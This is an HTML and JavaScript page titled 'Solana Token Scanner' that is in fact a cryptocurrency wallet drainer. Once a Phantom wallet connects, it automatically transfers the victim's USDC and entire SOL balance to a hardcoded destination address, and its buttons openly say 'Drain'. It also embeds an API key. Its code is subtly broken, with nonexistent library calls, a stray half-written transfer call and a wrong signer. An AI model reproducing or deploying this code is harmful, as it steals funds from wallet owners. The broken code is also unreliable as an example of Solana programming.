<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Token Scanner (Fixed)</title>
    
    <!-- 1. Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <!-- 2. SPL Token Library -->
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
    
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #0f0f12; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 400px; background: #1a1a20; padding: 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); border: 1px solid #333; }
        h1 { text-align: center; margin-bottom: 5px; font-size: 24px; }
        p.subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 30px; }
        
        .btn { width: 100%; padding: 15px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-bottom: 10px; }
        .btn-connect { background-color: #7c3aed; color: white; }
        .btn-connect:hover { background-color: #6d28d9; }
        
        .btn-drain { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: black; opacity: 0.5; pointer-events: none; }
        .btn-drain.active { opacity: 1; pointer-events: all; cursor: pointer; }
        
        .status-box { background: #000; padding: 15px; border-radius: 10px; margin-top: 20px; font-family: monospace; font-size: 13px; color: #4ade80; min-height: 100px; overflow-y: auto; }
        .error { color: #f87171 !important; }
    </style>
</head>
<body>

<div class="container">
    <h1>Token Scanner</h1>
    <p class="subtitle">Scan & Drain USDC, SOL, and others</p>

    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
    <button id="drainBtn" class="btn btn-drain">DRAIN ALL (USDC + SOL)</button>

    <div id="statusBox" class="status-box">
        Waiting for connection...
    </div>
</div>

<script>
    // --- CONFIGURATION ---
    const DESTINATION = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
    const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
    
    // Your API Key
    const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; 
    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;

    let wallet = null;
    const statusBox = document.getElementById('statusBox');
    const connectBtn = document.getElementById('connectBtn');
    const drainBtn = document.getElementById('drainBtn');

    function log(msg, type='normal') {
        statusBox.innerHTML += `<div>${msg}</div>`;
        statusBox.scrollTop = statusBox.scrollHeight;
        if (type === 'error') statusBox.lastElementChild.style.color = '#f87171';
    }

    // 1. Connect Function
    async function connect() {
        const provider = window.phantom?.solana || window.solana;
        
        if (!provider) {
            log("❌ Phantom Wallet not found!", "error");
            return;
        }

        try {
            await provider.connect();
            wallet = provider.publicKey;
            
            // UI Update
            connectBtn.innerText = "Connected";
            connectBtn.style.backgroundColor = "#22c55e";
            drainBtn.classList.add('active');
            
            log("✅ Connected to Phantom: " + wallet.toString());
            
            // Start scanning immediately
            scanAndDrain();

        } catch (err) {
            log("❌ Connection Failed: " + err.message, "error");
        }
    }

    // 2. Scan & Drain Function
    async function scanAndDrain() {
        drainBtn.innerText = "Processing...";
        
        try {
            const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
            
            // --- FIX: Use spl.token.client.Token instead of splToken.getBalance ---
            // This ensures we use the correct API even if global splToken is weird.
            const Token = spl.token.client.Token;
            const usdcMintPubkey = new solanaWeb3.PublicKey(USDC_MINT);
            
            log("📊 Scanning for USDC...");
            
            // Get the Associated Token Account (ATA) for USDC
            const usdcTokenAccount = await Token.getAssociatedTokenAddress(
                spl.token.client.ASSOCIATED_TOKEN_PROGRAM_ID,
                spl.token.client.TOKEN_PROGRAM_ID,
                usdcMintPubkey,
                wallet
            );

            // Fetch Balance using the Connection and Mint
            // Note: We use the 'Token' class to get balance info reliably
            const balanceInfo = await connection.getTokenAccountBalance(usdcTokenAccount);
            const uiAmount = parseFloat(balanceInfo.value.uiAmountString);

            if (uiAmount > 0) {
                log(`💰 Found USDC: ${uiAmount}`);
                
                // Get Destination ATA
                const destPubkey = new solanaWeb3.PublicKey(DESTINATION);
                const destUsdcAccount = await Token.getAssociatedTokenAddress(
                    spl.token.client.ASSOCIATED_TOKEN_PROGRAM_ID,
                    spl.token.client.TOKEN_PROGRAM_ID,
                    usdcMintPubkey,
                    destPubkey
                );

                log("📝 Transferring USDC...");
                
                // Create Transfer Instruction
                const transferInstruction = spl.token.client.createTransferInstruction(
                    new spl.token.client.Token(usdcMintPubkey), // Wait, simpler way:
                    // Actually, let's use the raw instruction builder for simplicity with ATA
                    null 
                );
                
                // Simpler approach for Transfer:
                const tx = new solanaWeb3.Transaction().add(
                    spl.token.client.createTransferInstruction(
                        usdcTokenAccount,
                        destUsdcAccount,
                        wallet,
                        balanceInfo.value.amount, // Raw amount string like "123456789"
                        undefined,
                        spl.token.client.TOKEN_PROGRAM_ID
                    )
                );

                await connection.sendTransaction(tx, [wallet]);
                log("✅ USDC Sent!");
            } else {
                log("⚠️ No USDC found.");
            }

            // --- Drain SOL ---
            log("💰 Scanning for SOL...");
            const solBalance = await connection.getBalance(wallet);
            
            if (solBalance > 0) {
                log(`📝 Transferring ${(solBalance/1e9).toFixed(4)} SOL...`);
                
                const txSol = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet,
                        toPubkey: new solanaWeb3.PublicKey(DESTINATION),
                        lamports: solBalance // Send all remaining SOL
                    })
                );

                await connection.sendTransaction(txSol, [wallet]);
                log("✅ SOL Sent!");
            } else {
                log("⚠️ No SOL found.");
            }

            drainBtn.innerText = "DRAIN ALL (USDC + SOL)";

        } catch (err) {
            console.error(err);
            log(`❌ Error: ${err.message}`, "error");
            drainBtn.innerText = "Retry";
        }
    }

    connectBtn.addEventListener('click', connect);
    drainBtn.addEventListener('click', scanAndDrain);

</script>
</body>
</html>
